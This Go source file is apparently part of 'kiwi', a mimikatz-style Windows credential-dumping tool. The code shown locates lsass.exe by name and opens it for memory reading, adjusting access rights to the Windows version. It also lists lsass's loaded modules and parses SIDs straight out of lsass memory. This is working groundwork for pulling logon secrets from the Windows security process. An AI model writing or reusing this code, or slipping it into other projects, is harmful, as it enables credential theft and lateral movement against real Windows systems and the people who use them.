package kiwi

import (
	"fmt"
	"sort"
	"strings"
	"sync"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/module/windows/api"
)

// lsass contains PID and module information about lsass.exe.
type lsass struct {
	ctx *Kiwi

	pid   uint32
	pidMu sync.Mutex

	modules    []*basicModuleInfo
	modulesRWM sync.RWMutex
}

func newLsass(ctx *Kiwi) *lsass {
	return &lsass{ctx: ctx}
}

func (lsass *lsass) logf(lv logger.Level, format string, log ...interface{}) {
	lsass.ctx.logger.Printf(lv, "kiwi-lsass", format, log...)
}

func (lsass *lsass) log(lv logger.Level, log ...interface{}) {
	lsass.ctx.logger.Println(lv, "kiwi-lsass", log...)
}

func (lsass *lsass) getPID() (uint32, error) {
	lsass.pidMu.Lock()
	defer lsass.pidMu.Unlock()
	if lsass.pid != 0 {
		return lsass.pid, nil
	}
	pid, err := api.GetProcessIDByName("lsass.exe")
	if err != nil {
		return 0, err
	}
	defer func() {
		lsass.logf(logger.Info, "PID is %d", lsass.pid)
	}()
	l := len(pid)
	if l == 1 {
		lsass.pid = pid[0]
		return lsass.pid, nil
	}
	// if appear multi PID, select minimize
	ps := make([]int, l)
	for i := 0; i < l; i++ {
		ps[i] = int(pid[i])
	}
	sort.Ints(ps)
	lsass.pid = uint32(ps[0])
	return lsass.pid, nil
}

func (lsass *lsass) OpenProcess() (windows.Handle, error) {
	// check is running on WOW64
	wow64, err := lsass.ctx.isWow64()
	if err != nil {
		return 0, err
	}
	if wow64 {
		return 0, errors.New("kiwi (x86) can't access x64 process")
	}
	pid, err := lsass.getPID()
	if err != nil {
		return 0, errors.WithMessage(err, "failed to get pid about lsass.exe")
	}
	major, _, _ := lsass.ctx.getWindowsVersion()
	var da uint32 = windows.PROCESS_VM_READ
	if major < 6 {
		da |= windows.PROCESS_QUERY_INFORMATION
	} else {
		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
	}
	return api.OpenProcess(da, false, pid)
}

func (lsass *lsass) GetBasicModuleInfo(pHandle windows.Handle, name string) (*basicModuleInfo, error) {
	lsass.modulesRWM.Lock()
	defer lsass.modulesRWM.Unlock()
	if len(lsass.modules) == 0 {
		modules, err := lsass.ctx.getVeryBasicModuleInfo(pHandle)
		if err != nil {
			return nil, err
		}
		lsass.modules = modules
		lsass.log(logger.Info, "load module information successfully")
	}
	for _, module := range lsass.modules {
		if strings.EqualFold(module.name, name) {
			return module, nil
		}
	}
	return nil, errors.Errorf("module %s is not exist in lsass.exe", name)
}

func (lsass *lsass) ReadSID(pHandle windows.Handle, address uintptr) (string, error) {
	var n byte
	_, err := api.ReadProcessMemory(pHandle, address+1, &n, 1)
	if err != nil {
		return "", errors.WithMessage(err, "failed to read number about SID")
	}
	// version + number + SID identifier authority + value
	size := uintptr(1 + 1 + 6 + 4*n)
	buf := make([]byte, size)
	_, err = api.ReadProcessMemory(pHandle, address, &buf[0], size)
	if err != nil {
		return "", errors.WithMessage(err, "failed to read SID")
	}
	// identifier authority
	ia := convert.BEBytesToUint32(buf[4:8])
	format := "S-%d-%d" + strings.Repeat("-%d", int(n))
	// format SID
	v := []interface{}{buf[0], ia}
	for i := 1 + 1 + 6; i < len(buf); i += 4 {
		v = append(v, convert.LEBytesToUint32(buf[i:i+4]))
	}
	return fmt.Sprintf(format, v...), nil
}

func (lsass *lsass) Close() {
	lsass.ctx = nil
}
